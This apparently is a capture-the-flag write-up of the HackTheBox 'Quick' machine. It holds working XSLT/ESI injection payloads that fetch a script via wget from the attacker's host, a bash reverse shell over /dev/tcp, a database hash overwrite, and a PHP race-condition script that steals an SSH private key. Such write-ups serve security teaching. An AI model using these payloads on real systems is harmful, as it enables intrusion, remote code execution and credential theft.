---
date: 2020-08-29 23:48:05
layout: post
title: HackTheBox Quick Writeup
subtitle: Hackthebox Quick Writeup.
description: >-
  in this blog i've explained how to solve Quick machine in hackthebox
image: https://i.ibb.co/BPCmLkz/logo.png
optimized_image: https://i.ibb.co/BPCmLkz/logo.png
category: hackthebox
tags:
  - hackthebox
  - Quick
author: Ahmed Fatouh
paginate: true
---



# []()Methodology

* Installing needed packages and tools to access the http3 protocol.
* using quiche to get content of the **quick.htb:443**.
* Getting a **Connectivity.pdf** that contains a password.
* using custom wordlist to guess the email address.
* logged in to quick.htb
* XSLT Injection lead to RCE.
* got user.txt
* Race Condition --> Privilege Escalation to **Srvadm**. 
* Privilege Escalation.

# []()Nmap Scan

> as always, i did nmap scan to find out which servicecs was running in this machine, i found some important ports like 22 for ssh and 9001 for apache.

> **nmap -sC -sV -oN scan.txt 10.10.10.186**

```ruby

Nmap scan report for 10.10.10.186
Host is up (0.30s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Quick | Broadband Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

* after some enumeration, my friend told me to make udp scan for ports because it's will help me to find out something, so let's do it.

> **nmap -sU quick.htb -oN udp.txt**

```ruby

Not shown: 997 closed ports
PORT      STATE         SERVICE
443/udp   open|filtered https
1031/udp  open|filtered iad2
54114/udp open|filtered unknown



```

* there is 443 Port for https --> **HTTP/3**.

### []() Checking The Web-Page on port **9001**.

* It is serving a broadband-service related web-app

> ![](https://i.ibb.co/jZkw5ZS/webpage.png)

* there is nothing in the web page, let's do Directory bruteforce now.

> **gobuster dir -u http://quick.htb:9001/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s 200**

```ruby

/index.php (Status: 200)
/search.php (Status: 200)
/home.php (Status: 200)
/login.php (Status: 200)
/clients.php (Status: 200)
/db.php (Status: 200)

```

* there is login page too, that's cool, there is nothing in db.php, there now SQL injection in login page, it's time for Quiche.

# []()Accessing The HTTP/3 Protocol with Quiche

* For accessing the protocol HTTP/3 i am going to use [Quiche](https://developers.cloudflare.com/http3/intro/http3-client/)

> **cargo build --examples**

* follow the instructions.

* now let's make a request to **quick.htb:443**

> **RUST_LOG="info" ./http3-client https://quick.htb:443/**

> ![](https://i.ibb.co/zPk6XWh/quiche.png)

* nice, our magic work hahahaha, let's do some enumeration.

> there are three directories.
>
> ![](https://i.ibb.co/Yfjbr7G/imp.png)

* let's go to see the **index.php**

> **RUST_LOG="info" ./http3-client https://quick.htb:443/index.php**

```ruby

<html>
<title> Quick | Customer Portal</title>
<h1>Quick | Portal</h1>
<head>
<style>
ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

/* Change the link color on hover */
li a:hover {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
</html>


```

* cool, now we need to enum these files.

* in the docs, directory i found some PDFs which contain a password of the login panel.

> **RUST_LOG="info" ./http3-client https://quick.htb:443/index.php\?view\=docs**

> ![](https://i.ibb.co/GkPD04n/connectivit.png)

* let's download this files with.

> **RUST_LOG="info" ./http3-client https://quick.htb:443/docs/QuickStart.pdf > QuickStart.pdf**

> ![](https://i.ibb.co/w0n6MfM/quick.png)

> after opening the pdf, i found a password for registered email address, so we need to know what is this email.

> ![](https://i.ibb.co/Dp9Cqq4/password.png)

### []()Guessing Email address

> the first thing i did was to go to the web page and look for any users and i found 4 users **elisa,tom,roy,james**.

> ![](https://i.ibb.co/d0rtwHD/users.png)

* and in the clients page we will use the country and client names as a domains. 

> ![](https://i.ibb.co/D4rR2Tc/clients.png)

* let's start, here is my emails wordlist.

```ruby

tim@wink.us
roy@wink.us
elisa@wink.us
james@wink.us
mike@wink.us
jane@wink.us
john@wink.us
LazyCoop@wink.us
ScoobyDoo@wink.us
PenguinCrop@wink.us
QConsulting@wink.us
tim@wink.me.uk
roy@wink.me.uk
elisa@wink.me.uk
james@wink.me.uk
mike@wink.me.uk
jane@wink.me.uk
john@wink.me.uk
LazyCoop@wink.me.uk
ScoobyDoo@wink.me.uk
PenguinCrop@wink.me.uk
QConsulting@wink.me.uk
tim@wink.uk
roy@wink.uk
elisa@wink.uk
james@wink.uk
mike@wink.uk
jane@wink.uk
john@wink.uk
LazyCoop@wink.uk
ScoobyDoo@wink.uk
PenguinCrop@wink.uk
QConsulting@wink.uk
tim@wink.me.us
roy@wink.me.us
elisa@wink.me.us
james@wink.me.us
mike@wink.me.us
jane@wink.me.us
john@wink.me.us
LazyCoop@wink.me.us
ScoobyDoo@wink.me.us
PenguinCrop@wink.me.us
QConsulting@wink.me.us
tim@quick.htb
roy@quick.htb
elisa@quick.htb
james@quick.htb
mike@quick.htb
jane@quick.htb
john@quick.htb
LazyCoop@quick.htb
ScoobyDoo@quick.htb
PenguinCrop@quick.htb
QConsulting@quick.htb
tim@china.cn
roy@china.cn
elisa@china.cn
james@china.cn
mike@china.cn
jane@china.cn
john@china.cn
LazyCoop@china.cn
ScoobyDoo@china.cn
PenguinCrop@china.cn
QConsulting@china.cn
tim@quick.it
roy@quick.it
elisa@quick.it
james@quick.it
mike@quick.it
jane@quick.it
john@quick.it
LazyCoop@quick.it
ScoobyDoo@quick.it
PenguinCrop@quick.it
QConsulting@quick.it
tim@wink.it
roy@wink.it
elisa@wink.it
james@wink.it
mike@wink.it
jane@wink.it
john@wink.it
LazyCoop@wink.it
ScoobyDoo@wink.it
PenguinCrop@wink.it
QConsulting@wink.it
LazyCoop@lazycoop.uk
ScoobyDoo@lazycoop.uk
PenguinCrop@lazycoop.uk
QConsulting@lazycoop.uk
tim@lazycoop.uk
roy@lazycoop.uk
elisa@lazycoop.uk
james@lazycoop.uk
mike@lazycoop.uk
jane@lazycoop.uk
john@lazycoop.uk
tim@wink.com.us
roy@wink.com.us
elisa@wink.com.us
james@wink.com.us
mike@wink.com.us
jane@wink.com.us
john@wink.com.us
LazyCoop@wink.com.us
ScoobyDoo@wink.com.us
PenguinCrop@wink.com.us
QConsulting@wink.com.us
tim@wink.com.uk
roy@wink.com.uk
elisa@wink.com.uk
james@wink.com.uk
jane@wink.com.uk
LazyCoop@wink.com.uk
ScoobyDoo@wink.com.uk
PenguinCrop@wink.com.uk
QConsulting@wink.com.uk
tim@wink.uk.com
roy@wink.uk.com
elisa@wink.uk.com
james@wink.uk.com
mike@wink.uk.com
jane@wink.uk.com
john@wink.uk.com
LazyCoop@wink.uk.com
ScoobyDoo@wink.uk.com
PenguinCrop@wink.uk.com
QConsulting@wink.uk.com
tim@wink.us.com
roy@wink.us.com
elisa@wink.us.com
james@wink.us.com
mike@wink.us.com
jane@wink.us.com
john@wink.us.com
LazyCoop@wink.us.com
ScoobyDoo@wink.us.com
PenguinCrop@wink.us.com
QConsulting@wink.us.com
tim@wink.me.us
roy@wink.me.us
elisa@wink.me.us
james@wink.me.us
mike@wink.me.us
jane@wink.me.us
john@wink.me.us
LazyCoop@wink.me.us
ScoobyDoo@wink.me.us
PenguinCrop@wink.me.us
QConsulting@wink.me.us
tim@wink.me.uk
roy@wink.me.uk
elisa@wink.me.uk
james@wink.me.uk
mike@wink.me.uk
jane@wink.me.uk
john@wink.me.uk
LazyCoop@wink.me.uk
ScoobyDoo@wink.me.uk
PenguinCrop@wink.me.uk
QConsulting@wink.me.uk
tim@wink.us.com
roy@wink.us.com
elisa@wink.us.com
james@wink.us.com
mike@wink.us.com
jane@wink.us.com
john@wink.us.com
LazyCoop@wink.us.com
ScoobyDoo@wink.us.com
PenguinCrop@wink.us.com
QConsulting@wink.us.com
tim@wink.uk.com
roy@wink.uk.com
elisa@wink.uk.com
james@wink.uk.com
mike@wink.uk.com
jane@wink.uk.com
john@wink.uk.com
LazyCoop@wink.uk.com
ScoobyDoo@wink.uk.com
PenguinCrop@wink.uk.com
QConsulting@wink.uk.com
tim@wink.us.com
roy@wink.us.com
elisa@wink.us.com
james@wink.us.com
mike@wink.us.com
jane@wink.us.com
john@wink.us.com
LazyCoop@wink.us.com
ScoobyDoo@wink.us.com
PenguinCrop@wink.us.com
QConsulting@wink.us.com
tim@wink.co.uk
roy@wink.co.uk
elisa@wink.co.uk
james@wink.co.uk
mike@wink.co.uk
jane@wink.co.uk
john@wink.co.uk
LazyCoop@wink.co.uk
ScoobyDoo@wink.co.uk
PenguinCrop@wink.co.uk
QConsulting@wink.co.uk

```
> i will use BurpSuite Intruder for bruteforcing the email address.

> ![](https://i.ibb.co/5hdg4BG/emailfound.png)

* cool we found the email

> Email:**elisa@wink.co.uk**, Password:**Quick4cc3$$**

> ![](https://i.ibb.co/Rz834Y4/done.png)

> This is a Ticketing System which is powered by Esigate and the Esigate vulnerable to XSLT injection which leading to RCE.

> ![](https://i.ibb.co/GkKZTHD/esi.png)

> accordind to this article [ESI Injection Part 2](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/), we need xml,xsl files, so let me explain what i did in this point.

* note: We cant use two or more ticket containg the same filename so everytime any failure happen you need to rename your .xml and .xsl file.

> i make three xml files and three xsl files, **the important is the xsl file, i named the file upload.xsl,chmod.xsl,execute.xsl**, and also for xml files.

> the first file which name is upload.xsl this will upload my bash script which contain a reverse shell.

> the seconed file which name is chmod.xsl will give the bash script executable right.

> the third file which name is execute.xsl will run my file. here is the content of the files.

### []() upload.xsl

```ruby
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[wget http://10.10.16.44:8000/user.sh]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>

```

### []()chmod.xsl

```ruby

<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[chmod +x ./user.sh]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>

```
### []()execute.xsl

```ruby

<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[./user.sh]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>

```
* and here is the **user.sh**

```ruby

#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.16.44/9002 0>&1"

```

* let's start

# []() Got Shell as Sam

> let's Raise ticket and intercept the request with burp.

> Payload: title=sdasd&msg=asdasda&id=<esi:include+src="http://10.10.1x.xx:8000/upload.xml"+stylesheet="http://10.10.1x.xx:8000/upload.xsl">
</esi:include>

> look at this.
>
> ![](https://i.ibb.co/2ngtk5P/server.png)

> ![](https://i.ibb.co/mcv7Sxg/wget.png)

* cool, now let's run the seconed file to make my script executable.

> Payload: title=sdasd&msg=asdasda&id=<esi:include+src="http://10.10.1x.xx:8000/chmod.xml"+stylesheet="http://10.10.1x.xx:8000/chmod.xsl">
</esi:include>

> ![](https://i.ibb.co/FW2F1Zh/2.png)
>
> ![](https://i.ibb.co/Cs6Qj6G/22.png)

* now let's get a reverse shell.

> Payload: title=sdasd&msg=asdasda&id=<esi:include+src="http://10.10.1x.xx:8000/execute.xml"+stylesheet="http://10.10.1x.xx:8000/execute.xsl">
</esi:include>

> ![](https://i.ibb.co/tJVrJXv/sam2.png)
>
> ![](https://i.ibb.co/ScC7SGM/sam.png)

* cool, let's read user flag now.

> ![](https://i.ibb.co/7jV7y42/userflag.png)

# []()Privilege Escalation --> Srvadm

> after some enumeration i found another subdomain in **/etc/apache2/sites-available**.

> ![](https://i.ibb.co/PWBCzJF/srvadm.png)

> let's add it to my hosts list and open it.

> ![](https://i.ibb.co/FWHVq7n/printer.png)

> let's go to **/var/www/html/** and read the **db.php**

> ![](https://i.ibb.co/X71CRKN/db.png)

> okey now we need to login to this printer page, let's dump Database first.

> **mysql -h localhost -udb_adm -pdb_p4ss**

> type **use quick;** to change the database to Quick.

> ![](https://i.ibb.co/f9g592J/dumping.png)

> **select * from quick.users;**

> ![](https://i.ibb.co/FmHrsYG/emailspasswords.png)

> i couldn't decrypt the password of srvadm so i changed the hashs to the eilsa password hash.

> **UPDATE users SET password='c6c35ae1f3cb19438e0199cfa72a9d9d';**

> now we can login to printer with elisa password.

> ![](https://i.ibb.co/crMXQ3H/showprinter.png)

> now there is file in **/var/www/printer/**. this is file vulnerable to **Race Condition**.

> ![](https://i.ibb.co/F4Ctv2c/job.png)

> What the file is doing is making a file with name of the timestamp.And if we read the content of the file it is sending the file to print it to the ip of a specified port, If you look at the ad-printer from the printer subdomain there is an ip and port to be specified.

> ![](https://i.ibb.co/YdNJbWC/addprinter.png)

> we have read/write permissions to the directory /var/www/jobs/ right? so i will symlink the id_rsa of srvadm and start a listener on the port that i specified on add_printer.php and then access the file job.php.

* here is my script for this point --> **Race Condition Script**.

```ruby

<?php

$dir = '/var/www/jobs/';

function over ($file) {
        echo $file;
        unlink($file);
        symlink('/home/srvadm/.ssh/id_rsa', $file);
}

while (true) {
        $files = scandir($dir);
        foreach ($files AS $file) {
                if ($file{0} === '.') {
                        continue;
                }
                $f = $dir . $file;
                if (is_file($f) && !is_link($f)) {
                        over($f);
                }
                break;
        }
}
?>

```

> first i will add my ip as a printer.

> ![](https://i.ibb.co/yWrjnTC/xdev.png)

> then start a nc listener on 9100 port and click connect to the printer and run my php file..

> ![](https://i.ibb.co/q0Z4n8Q/up.png)
>
> ![](https://i.ibb.co/BjdjWyL/up2.png)

> click on add a job.

> ![](https://i.ibb.co/VgzfpG7/srvadmprint.png)

* and here's the id_rsa for the srvadm.

> ![](https://i.ibb.co/HhQZCF2/privatekey.png)

* let's login as srvadm now.

> ![](https://i.ibb.co/64wkp9z/loginasrvamd.png)

* nice!

# []()Privilege Escalation --> root

* MrR3boot in the forums told us **stay home**. and this is a hint for the root hahahahah.

> go to **~/.cache/conf.d** and look at the content of the **printers.php** file, you will find this line

> DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer

* let's decode it as url.

> DeviceURIhttps://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer

> the password for root user is: **&ftQ4K3SGde8?**.

> use ssh to login as root.

> ![](https://i.ibb.co/945wKTc/done2.png)

* Thanks for reading.
* cheers!.

 <script src="https://www.hackthebox.eu/badge/103789"></script>
